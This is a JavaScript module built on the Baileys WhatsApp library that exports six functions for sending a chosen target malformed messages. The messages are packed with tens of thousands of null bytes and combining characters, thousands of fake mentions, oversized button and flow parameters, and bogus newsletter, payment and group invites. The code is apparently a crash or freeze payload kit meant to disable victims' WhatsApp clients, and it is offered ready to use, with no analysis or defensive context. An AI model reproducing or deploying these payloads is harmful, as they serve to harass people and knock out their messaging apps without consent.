const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap
} = require("@whiskeysockets/baileys");
const axios = require("axios");
const crypto = require("crypto");
const fs = require('fs');  
const ImgCrL = fs.readFileSync('./ImgCrL.jpg')
async function thumb() {
  const sharp = require("sharp");
  const axios = require("axios");
  const response = await axios.get("https://files.catbox.moe/srk9wf.jpg", { responseType: "arraybuffer" });
  const buffer = Buffer.from(response.data);
  const resized = await sharp(buffer)
    .resize(250, 250, { fit: "cover" })
    .jpeg({ quality: 100 })
    .toBuffer();
  return resized.toString("base64");
};
const xxx = async () => {
  const sharp = require("sharp");
  const axios = require("axios");
  const response = await axios.get("https://files.catbox.moe/srk9wf.jpg", { responseType: "arraybuffer" });
  const buffer = Buffer.from(response.data);
  const resized = await sharp(buffer)
    .resize(250, 250, { fit: "cover" })
    .jpeg({ quality: 100 })
    .toBuffer();
  return resized.toString("base64");
};
async function delayJembut(sock, target) {
  try {
    const n = await sock.relayMessage(
      target,
      {
        extendedTextMessage: {
          text: "\u0000".repeat(10000),
          matchedText: "⃝꙰꙰꙰".repeat(10000),
          description: "Its Me Icha",
          title: "᬴".repeat(10000),
          previewType: "NONE",
          jpegThumbnail: null,
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "⃝꙰꙰꙰",
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      },
      { participant: { jid: target } }
    );
    await sock.sendMessage(target, {
      delete: { fromMe: true, remoteJid: target, id: n }
    });
  } catch (err) {
    console.error("error:", err);
    throw new Error(err.message);
  }
}
async function blankButton(sock, target) {
await sock.sendMessage(
  target,
  {
    text: "\u0000",
    buttons: [
      {
        buttonId: ".",
        buttonText: { displayText: "Its Me Icha" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "᬴".repeat(70000),
            sections: [
              {
                title: "\u0000".repeat(5000),
                highlight_label: "label",
                rows: []
              }
            ]
          })
        }
      },
      {
        buttonId: ".",
        buttonText: { displayText: "Its Me Icha" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "᬴".repeat(70000),
            sections: [
              {
                title: "\u0000".repeat(5000),
                highlight_label: "label",
                rows: []
              }
            ]
          })
        }
      },
      {
        buttonId: ".",
        buttonText: { displayText: "Its Me Icha" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({
            title: "᬴".repeat(70000),
            sections: [
              {
                title: "\u0000".repeat(5000),
                highlight_label: "label",
                rows: []
              }
            ]
          })
        }
      }
    ],
    headerType: 1
  }, { participant: { jid: target } });
}
async function Blank2(sock, target) {
try {
const msg = generateWAMessageFromContent(target, {
  viewOnceMessage: {
    message: {
      interactiveMessage: {
        body: { text: "\u0000" },
        contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ោ៝".repeat(60000)
              })
            },
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ោ៝".repeat(60000)
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                flow_message_version: "3",
                flow_token: "unused",
                flow_id: "9876543210",
                flow_cta: "ោ៝".repeat(30000),
                flow_action: "form_submit",
                flow_action_payload: { from_id: null },
                icon: "PROMOTE"
              })
            }
          ],
          messageParamsJson: "{}".repeat(10000)
        }
      }
    }
  }
}, {});
  await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
   });
  } catch (err) {
    console.error(err);
  }
}
async function bClck(sock, target) {
const msg = {
  newsletterAdminInviteMessage: {
    newsletterJid: "1@newsletter",
    newsletterName: "ោ៝".repeat(10000),
    caption: "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
    inviteExpiration: "999999999",
    jpegThumbnail: await thumb(),
    contextInfo: {
      mentionedJid: Array.from(
        { length: 2000 },
        () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      ),
      remoteJid: "status@broadcast",
      isForwarded: true,
      forwardingScore: 9999,
      externalAdReply: {
        quotedAd: {
          advertiserName: "\u0000".repeat(60000),
          mediaType: "IMAGE",
          jpegThumbnail: await thumb(),
          caption: "Icha" + "𑇂𑆵𑆴𑆿".repeat(60000)
        },
        placeholderKey: {
          remoteJid: "0s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }
      },
      quotedMessage: {
        groupInviteMessage: {
          groupJid: "1@g.us",
          inviteCode: "abcd1234",
          inviteExpiration: null,
          groupName: "ꦽ".repeat(30000),
          jpegThumbnail: null
        }
      }
    }
  }
};
 await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}
async function invisibleDozer(sock, target) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\u0000" },
              nativeFlowMessage: {
                messageParamsJson: "{}".repeat(10000),
              },
              contextInfo: {
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: Array.from(
                  { length: 42000 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
              }
            }
          }
        }
      },
      {}
    );
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.error(err);
    throw new Error(err.message);
  }
}
async function crsA(sock, target) {
  const generateMentions = (count) => [
    "0@s.whatsapp.net",
    ...Array.from({ length: count }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
  ];
  const cc = {
    mentionedJid: generateMentions(1999),
    remoteJid: "X",
    participant: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
    stanzaId: "123",
    groupMentions: [],
    entryPointConversionSource: "non_contact",
    entryPointConversionApp: "whatsapp",
    entryPointConversionDelaySeconds: 467593,
    quotedMessage: {
      paymentInviteMessage: {
        serviceType: 3,
        expiryTimestamp: Date.now() + 1814400000,
        contextInfo: {
          mentionedJid: generateMentions(1999),
          forwardedAiBotMessageInfo: {
            botName: "META AI",
            botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
            creatorName: "Bot"
          }
        }
      }
    }
  };
  const _message = {
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "322@newsletter",
          newsletterName: "ោ៝".repeat(20000),
          caption: "ោ៝".repeat(20000),
          jpegThumbnail: await thumb(),
          inviteExpiration: Date.now() + 999999999,
          inviteLink: `https://chat.whatsapp.com/${"\x10".repeat(5000)}${"ꦾ".repeat(5000)}`, 
          isInviteOnly: true,
          isPinned: true,
          contextInfo: cc
        }
      }
    }
  };
  const message = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: `> *its me icha*${"ោ៝".repeat(20000)}`,
          matchedText: "https://wa.me/stickerpack/\x10",
          description: "ꦾꦾ".repeat(10000),
          title: "ꦾꦾ".repeat(10000),
          previewType: "NONE",
          jpegThumbnail: await thumb(),
          inviteLinkGroupTypeV2: "DEFAULT",
          inviteLink: `https://chat.whatsapp.com/${"\x10".repeat(5000)}${"ꦾ".repeat(5000)}`,
          contextInfo: cc
        }
      }
    }
  };
  const msg = generateWAMessageFromContent(target, message, {});
  const _msg = generateWAMessageFromContent(target, _message, {});
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
  await sock.relayMessage(target, _msg.message, {
    messageId: _msg.key.id,
    participant: { jid: target }
  });
}
module.exports = { blankButton, Blank2, crsA, bClck, invisibleDozer, delayJembut }